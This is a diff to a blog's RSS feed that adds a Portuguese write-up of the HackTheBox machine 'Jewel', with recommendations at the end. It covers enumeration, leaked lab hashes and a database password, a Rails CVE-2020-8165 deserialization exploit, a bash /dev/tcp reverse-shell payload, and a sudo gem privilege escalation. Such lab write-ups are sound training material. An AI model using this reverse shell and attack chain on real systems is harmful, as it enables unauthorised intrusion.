@@ -6,17 +6,268 @@
         <description>Recent content in Posts on Haderach</description>
         <generator>Hugo -- gohugo.io</generator>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sat, 26 Sep 2020 13:59:56 -0300</lastBuildDate>
+        <lastBuildDate>Sat, 20 Feb 2021 10:00:00 -0300</lastBuildDate>
         <atom:link href="https://brunomcuesta.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
         
         <item>
-            <title>Primeiro Post</title>
-            <link>https://brunomcuesta.github.io/posts/2020/09/primeiro-post/</link>
-            <pubDate>Sat, 26 Sep 2020 13:59:56 -0300</pubDate>
+            <title>HackTheBox - Jewel</title>
+            <link>https://brunomcuesta.github.io/posts/2021/02/hackthebox-jewel/</link>
+            <pubDate>Sat, 20 Feb 2021 10:00:00 -0300</pubDate>
             
-            <guid>https://brunomcuesta.github.io/posts/2020/09/primeiro-post/</guid>
-            <description>Primeiro post!</description>
-            <content type="html"><![CDATA[<p>Primeiro post!</p>
+            <guid>https://brunomcuesta.github.io/posts/2021/02/hackthebox-jewel/</guid>
+            <description>Neste primeiro post veremos a resolução da máquina &amp;lsquo;Jewel&amp;rsquo; do HackTheBox. A resolução foi efetuada em outubro de 2020, quando a máquina estava &amp;lsquo;ativa&amp;rsquo;. Em fevereiro de 2021 a mesma passou para &amp;lsquo;retirada&amp;rsquo; e com as evidências coletadas anteriormente foi possível publicar este &amp;lsquo;writeup&amp;rsquo;.
+Informações da Máquina IP: 10.10.10.211
+Sistema Operacional: Linux
+Nível de dificuldade: Médio
+Varredura e Enumeração Port Scan Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</description>
+            <content type="html"><![CDATA[
+
+<p>Neste primeiro post veremos a resolução da máquina &lsquo;Jewel&rsquo; do <a href="https://brunomcuesta.github.io/" title="HackTheBox" target="_blank">HackTheBox</a>. A resolução foi efetuada em outubro de 2020, quando a máquina estava &lsquo;ativa&rsquo;. Em fevereiro de 2021 a mesma passou para &lsquo;retirada&rsquo; e com as evidências coletadas anteriormente foi possível publicar este &lsquo;writeup&rsquo;.</p>
+
+<h3 id="informações-da-máquina">Informações da Máquina</h3>
+
+<p>IP: 10.10.10.211</p>
+
+<p>Sistema Operacional: Linux</p>
+
+<p>Nível de dificuldade: Médio</p>
+
+<h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
+
+<h4 id="port-scan">Port Scan</h4>
+
+<p>Ao executar o Nmap são mostradas três portas abertas: 22, 8000 e 8080.</p>
+
+
+    <img src="https://i.imgur.com/tytB0Oe.png"  alt="Nmap"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Utilizando os parâmetros do Nmap podemos executar também os scripts padrões para verificar vulnerabilidades, as versões dos serviços que estão rodando e gerar um arquivo com o resultado do scan.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">nmap -v -sC -sV -p 22,8000,8080 -Pn 10.10.10.211 -oN jewel-detail</code></pre></div>
+
+    <img src="https://i.imgur.com/YJXvrR8.png"  alt="Nmap"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h4 id="webserver">Webserver</h4>
+
+<p>Na saída do comando Nmap é possível verificar duas aplicações Web rodando, uma na porta 8000 e outra na 8080.
+Na porta 8080, onde o Apache é executado, surge um &lsquo;Blog&rsquo;, permitindo o cadastro de usuário, login e edição do usuário cadastrado.</p>
+
+<p>URL: <a href="http://10.10.10.211:8080/" target="_blank">http://10.10.10.211:8080/</a></p>
+
+
+    <img src="https://i.imgur.com/VNqtOy2.png"  alt="Editar usuário"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Ao acessar o link para o recurso &lsquo;gitweb&rsquo; na porta 8000 surge o código fonte do &lsquo;Blog&rsquo;, tendo o Git como seu sistema de controle de versão.</p>
+
+<p>URL: <a href="http://10.10.10.211:8000/gitweb/" target="_blank">http://10.10.10.211:8000/gitweb/</a></p>
+
+
+    <img src="https://i.imgur.com/d7HCbmI.png"  alt="Gitweb"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>O acesso às aplicações pode ser feito através de seu IP ou pelo seu domínio, editando o arquivo /etc/hosts na máquina do atacante.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo vi /etc/hosts</code></pre></div>
+<p>Inserir a linha correspondente ao arquivo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.211  jewel.htb</code></pre></div>
+<p>Desta forma as aplicações podem ser acessadas pelo browser com as seguintes URLs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://jewel.htb:8080/
+http://jewel.htb:8000/gitweb/</code></pre></div>
+<h3 id="vulnerabilidades">Vulnerabilidades</h3>
+
+<p>O sistema permite visualizar o perfil de outros usuários, sendo necessário apenas alterar a id do usuário na URL. Com isto foi possível obter o nome de usuário bill (id=01) e jennifer (id=02).</p>
+
+
+    <img src="https://i.imgur.com/gEeZYw6.png"  alt="Blog"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Além de poder visualizar os dados de outros usuários é possível alterar suas publicações e o campo de texto é vulnerável a HTML Injection.</p>
+
+
+    <img src="https://i.imgur.com/0q4O6JU.png"  alt="HTML Injection"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Analisando o código fonte do HTML foi encontrado o campo de senha comentado no form de usuário. Descomentando o código torna-se possível a alteração de senha do usuário.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-group&#34;</span>&gt;
+    &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span>&gt;Password&lt;/<span style="color:#f92672">label</span>&gt;
+    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-control&#34;</span> <span style="color:#a6e22e">placeholder</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Password&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user[password]&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user_password&#34;</span> /&gt;
+&lt;/<span style="color:#f92672">div</span>&gt;</code></pre></div>
+<p>Como se trata de uma aplicação onde o código fonte do &lsquo;Blog&rsquo; é gerenciado pelo Git, é possível navegar pela página e obter informações sobre a linguagem de programação (Ruby), o framework utilizado (Ruby on Rails) e suas versões.</p>
+
+
+    <img src="https://i.imgur.com/LF5vrJr.png"  alt="Commit"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Obtendo as credenciais na tabela users.</p>
+
+
+    <img src="https://i.imgur.com/UDDE3iO.png"  alt="Credentials"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">bill  bill@mail.htb  2020-08-25 08:13:58.662464  2020-08-25 08:13:58.662464     
+$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
+
+jennifer  jennifer@mail.htb  2020-08-25 08:54:42.8483  2020-08-25 08:54:42.8483        
+$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy</code></pre></div>
+<p>Ao executar o Linpeas no host mais credenciais foram descobertas.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">[+] Finding &#39;pwd&#39; or &#39;passw&#39; variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/home/bill/blog/config/database.yml:  password: beiw,aDoed1
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+/var/backups/dump_2020-08-27.sql:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
+/home/bill/blog/bd.sql:$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW</code></pre></div>
+<p>Conteúdo do arquivo /home/bill/blog/config/database.yml.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">production:
+  &lt;&lt;: *default
+  database: blog_development
+  host: localhost
+  port: 5432
+  username: rails_dev
+  password: beiw,aDoed1</code></pre></div>
+<p>Os dados do banco de dados PostgreSQL também estão expostos. No arquivo bd.sql a versão do banco e suas tabelas podem ser visualizadas.</p>
+
+
+    <img src="https://i.imgur.com/qj8LYnT.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Estrutura de tabelas no dump db.sql.</p>
+
+
+    <img src="https://i.imgur.com/xVLzmr6.png"  alt="bd.sql"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Também foi possível encontrar a versão do Ruby e do Gem (Gerenciador de Pacotes do Ruby).</p>
+
+
+    <img src="https://i.imgur.com/cS79HSr.png"  alt="Ruby Version"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>De posse das credenciais obtidas, nome de usuário e &lsquo;hashes&rsquo;, foi utilizado o hashcat para identificar o tipo de hash utilizado para o campo de senha. De acordo com o hashcat trata-se de uma hash bcrypt.</p>
+
+
+    <img src="https://i.imgur.com/fbU36GI.png"  alt="Hashcat"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Com o john foi possível quebrar o &lsquo;hash&rsquo; do usuário bill. A senha revelada é &lsquo;spongebob&rsquo;.</p>
+
+
+    <img src="https://i.imgur.com/nPlJmyJ.png"  alt="John"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Pesquisando por vulnerabilidades na versão 5.2.2.1 do Rails foi descoberta a CVE-2020-8165 no site <a href="https://brunomcuesta.github.io/" title="mitre.org" target="_blank">mitre.org</a>.</p>
+
+<p>URL: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165" target="_blank">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8165</a></p>
+
+
+    <img src="https://i.imgur.com/bRgeBwk.png"  alt="CVE-2020-8165"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Trata-se de uma vulnerabilidade de desserialização de dados não confiáveis que existe nas versões do Rails &lt;5.2.4.3, Rails &lt;6.0.3.1 e que pode permitir que um invasor desempacote objetos fornecidos pelo usuário em MemCacheStore e RedisCacheStore, resultando potencialmente em um RCE (Remote Code Execution).</p>
+
+<h3 id="exploração">Exploração</h3>
+
+<p>Buscando por exploits para a CVE-2020-8165 foi encontrado no <a href="https://brunomcuesta.github.io/" title="github" target="_blank">github</a> um exploit público.</p>
+
+
+    <img src="https://i.imgur.com/uUSwT37.png"  alt="Pesquisa de Exploits"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>URL: <a href="https://github.com/masahiro331/CVE-2020-8165" target="_blank">https://github.com/masahiro331/CVE-2020-8165</a></p>
+
+<p>O exploit consiste em encodar uma string de comando que será o payload a ser enviado ao servidor. O envio do payload é efetuado duas vezes usando o curl e o alvo utilizado é a página de cadastro de usuário.</p>
+
+<p>Para obter uma shell reversa o IP e porta no payload devem ser configurados conforme a máquina do atacante. O resultado será uma URL codificada, que pode ser usada no envio do cadastro de usuário através da interceptação da requisição com o Burp Suite. Ou diretamente com o curl, enviando duas requisições seguidas, conforme orientação do manual do exploit.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">irb(main):&gt; code = &#39;`/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#34;`&#39;</code></pre></div>
+<p>Obtendo a shell reversa.</p>
+
+
+    <img src="https://i.imgur.com/yFVyS2Y.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Obtendo a flag do usuário bill.</p>
+
+
+    <img src="https://i.imgur.com/8hWl8Wx.png"  alt="User Key"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
+
+<p>Após executar o exploit com o payload e receber a shell reversa foi possível analisar o conteúdo do diretório do usuário bill. Neste diretório foi encontrada a pasta oculta do Google Authenticator.</p>
+
+
+    <img src="https://i.imgur.com/PVwPiZF.png"  alt="Diretório Bill"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Ao tentar executar algum comando com o &lsquo;sudo&rsquo; utilizando este usuário surge a solicitação do código de autenticação do Google Authenticator (verificação em duas etapas).</p>
+
+<p>URL: <a href="https://github.com/google/google-authenticator/wiki" target="_blank">https://github.com/google/google-authenticator/wiki</a></p>
+
+<p>O código de verificação pode ser obtido com o addon Authenticator instalado no browser.</p>
+
+<p>URL: <a href="https://addons.mozilla.org/pt-BR/firefox/addon/auth-helper/" target="_blank">https://addons.mozilla.org/pt-BR/firefox/addon/auth-helper/</a></p>
+
+<p>Para utilizar o código gerado a data e horário do host devem estar sincronizados com a máquina do atacante. Para isto é necessário desabilitar o NTP de fuso-horário automático e setar a hora manualmente, de acordo com a hora e minutos da máquina Jewel.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ timedatectl set-ntp false
+$ sudo timedatectl set-time <span style="color:#e6db74">&#39;2020-10-26 22:34:18&#39;</span></code></pre></div>
+<p>Após efetuar a sincronização e gerar o código de verificação com o addon Authenticator é possível autenticar com as credenciais bill:spongebob e checar que tipo de permissões possui o usuário.</p>
+
+
+    <img src="https://i.imgur.com/nX6brom.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>O usuário bill possui privilégios de root no gem (gerenciador de pacotes do Ruby).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">(ALL : ALL) /usr/bin/gem</code></pre></div>
+<p>Buscando no <a href="https://brunomcuesta.github.io/" title="GTFOBins" target="_blank">GTFOBins</a> é possível encontrar a forma de escalar privilégios com o gem usando o sudo.</p>
+
+
+    <img src="https://i.imgur.com/QkM9UxI.png"  alt="GTFOBins"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Obtenção de root após a execução do comando com o sudo.</p>
+
+
+    <img src="https://i.imgur.com/TfwyjMs.png"  alt="Privesc"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<p>Obtendo a flag do usuário root.</p>
+
+
+    <img src="https://i.imgur.com/xp0tPmt.png"  alt="Flag Root"  class="center"  style="border-radius: 8px;"  />
+
+
+
+<h3 id="recomendações">Recomendações</h3>
+
+<p>Caso fosse um Pentest realizado para alguma empresa, estas seriam as recomendações para solucionar os problemas encontrados no host.</p>
+
+<ul>
+<li>Implementar um sistema de permissão de acesso à aplicação &lsquo;gitweb&rsquo;. Deve ser de uso restrito dos desenvolvedores do sistema e não deve estar acessível para qualquer usuário. Outra opção é remover a sua disponibilidade.</li>
+<li>Implementar a verificação de sessão de usuário na aplicação &lsquo;Blog&rsquo; para impedir que um usuário logado possa visualizar os dados de outros usuários.</li>
+<li>Revisão de código fonte da aplicação &lsquo;Blog&rsquo; para remover código comentado que possa comprometer a segurança do sistema.</li>
+<li>Implementar validação dos dados enviados nos dois lados da aplicação &lsquo;Blog&rsquo;, tanto no front-end quanto no back-end, para evitar o envio de dados maliciosos ao servidor.</li>
+<li>Atualizar o software utilizado para o desenvolvimento do sistema e suas dependências.</li>
+</ul>
 ]]></content>
         </item>
         
